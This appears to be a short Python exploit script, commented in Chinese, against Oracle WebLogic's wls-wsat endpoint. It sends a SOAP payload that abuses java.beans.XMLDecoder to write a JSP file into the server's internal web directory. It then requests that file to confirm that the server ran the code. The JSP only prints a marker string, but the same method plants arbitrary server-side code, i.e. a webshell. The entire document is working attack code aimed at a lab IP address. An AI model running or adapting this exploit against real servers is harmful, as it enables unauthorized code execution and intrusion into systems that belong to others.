import requests

url = r'http://192.168.150.131:7001/wls-wsat/CoordinatorPortType' # 利用的ip地址

payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ycc.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("yccxlj"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope> ''' # 执行的payload

headers = { # 请求包头部
    "Accept-Encoding":"gzip, deflate",
    "Accept":"*/*",
    "Accept-Language":"en",
    "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection":"close",
    "Content-Type":"text/xml",
    "Content-Length":"638"
} 

requests.post(url=url,data=payload,headers=headers) # 构造post请求包

webshell_path  = r'http://192.168.150.131:7001/bea_wls_internal/ycc.jsp' # 执行的ip地址
res = requests.get(url=webshell_path) 
print(res.text) # 以text格式输出